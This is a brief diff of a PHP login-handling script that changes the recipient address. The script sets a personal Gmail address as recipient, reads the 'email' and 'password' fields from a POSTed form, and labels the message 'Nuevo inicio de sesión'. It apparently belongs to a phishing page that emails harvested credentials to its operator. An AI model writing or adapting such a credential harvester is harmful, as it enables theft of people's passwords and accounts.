@@ -1,6 +1,6 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $to = "erickdanij@gmail.com"; // Cambia esto por el correo de la empresa
+    $to = "erickdaniloj@gmail.com"; // Cambia esto por el correo de la empresa
     $subject = "Nuevo inicio de sesión";
     $email = $_POST['email'];
     $password = $_POST['password'];
